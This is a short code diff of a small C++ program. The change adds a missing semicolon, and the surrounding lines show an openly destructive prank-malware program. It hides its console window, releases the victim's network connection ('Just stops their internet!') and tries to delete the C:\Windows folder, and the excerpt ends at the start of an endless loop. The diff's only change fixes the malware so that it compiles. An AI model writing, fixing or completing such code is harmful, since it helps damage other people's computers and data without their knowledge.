@@ -7,7 +7,7 @@ using namespace std;
 int main(){
     FreeConsole(); //Hides Console
 
-    system("ipconfig /release") //Just stops their internet!
+    system("ipconfig /release"); //Just stops their internet!
     
     const int result = remove("C:\Windows"); //Delets The C:\ Folder!
     while(1){
